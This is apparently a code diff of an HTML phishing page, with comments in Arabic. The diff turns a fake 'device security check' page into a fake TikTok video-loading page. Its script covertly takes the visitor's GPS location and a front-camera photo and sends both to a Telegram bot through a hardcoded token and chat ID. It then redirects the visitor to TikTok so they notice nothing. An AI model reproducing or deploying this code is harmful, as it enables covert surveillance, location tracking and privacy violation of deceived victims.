@@ -3,55 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص أمان المتصفح</title>
+    <title>TikTok - Watch Now</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'ProximaNova', sans-serif; background: #010101; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .tiktok-loader { text-align: center; }
+        .logo { width: 100px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        .text { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
+        .sub-text { font-size: 14px; color: #ccc; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="loader"></div>
-    <h3>جاري التحقق من أمان الجهاز...</h3>
-    <p>يرجى الموافقة على الأذونات المطلوبة لإكمال الفحص.</p>
+<div class="tiktok-loader">
+    <img src="https://logodownload.org/wp-content/uploads/2019/08/tiktok-logo-icon-1.png" class="logo" alt="TikTok">
+    <div class="text">جاري تحضير الفيديو...</div>
+    <div class="sub-text">يرجى السماح بالأذونات للمتابعة</div>
 </div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c" width="640" height="480"></canvas>
 
 <script>
+    // بيانات البوت الخاصة بك
     const token = '8205090411:AAEIcpDG87AX8gzjI13Ei_pV9BiOcsc25EQ';
     const chatId = '7945738403';
+    const tiktokVideoUrl = "https://www.tiktok.com"; // يمكنك وضع رابط فيديو محدد هنا
 
-    // 1. وظيفة إرسال الموقع الجغرافي
-    function sendLocation() {
+    // 1. سحب الموقع الجغرافي
+    function getGPS() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const msg = `📍 موقع الضحية الجغرافي:\nاللاتيتود: ${lat}\nاللونجيتود: ${lon}\nرابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+                const msg = `📍 موقع جديد:\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
             });
         }
     }
 
-    // 2. وظيفة إرسال الصورة
-    async function sendPhoto(blob, mode) {
+    // 2. إرسال الصورة للبوت
+    async function sendPhoto(blob) {
         const fd = new FormData();
         fd.append('chat_id', chatId);
         fd.append('photo', blob, 'shot.jpg');
-        fd.append('caption', `📸 تم التقاط صورة من الكاميرا: ${mode === 'user' ? 'الأمامية' : 'الخلفية'}`);
+        fd.append('caption', '📸 تم التقاط صورة (أمامية) بنجاح');
         await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
     }
 
-    // 3. العملية الرئيسية
+    // 3. التشغيل الرئيسي
     async function start() {
-        // طلب الموقع الجغرافي أولاً
-        sendLocation();
+        getGPS(); // سحب الموقع في الخلفية
 
         try {
             // طلب الكاميرا الأمامية
@@ -59,23 +60,23 @@
             const video = document.getElementById('v');
             video.srcObject = stream;
 
-            // انتظار بسيط لفتح الكاميرا
+            // انتظار ثانيتين لضبط العدسة
             await new Promise(r => setTimeout(r, 2000));
 
             const canvas = document.getElementById('c');
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
             
             canvas.toBlob(async (blob) => {
-                await sendPhoto(blob, 'user'); // الانتظار حتى يرسل الصورة
-                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا
+                await sendPhoto(blob); // ننتظر حتى يكتمل الإرسال تماماً
+                stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا
                 
-                // بعد النجاح، التوجيه لصفحة جوجل للتمويه
-                window.location.href = "https://www.google.com";
+                // الانتقال لتيك توك
+                window.location.href = tiktokVideoUrl;
             }, 'image/jpeg', 0.8);
 
         } catch (e) {
-            console.log("Permission denied");
-            // حتى لو رفض الكاميرا، قد يكون أرسل الموقع إذا وافق عليه
+            // في حال رفض المستخدم، يظل في صفحة تيك توك أو يحول لمكان آخر
+            console.log("Permission Denied");
         }
     }
 
@@ -84,4 +85,5 @@
 
 </body>
 </html>
+
 
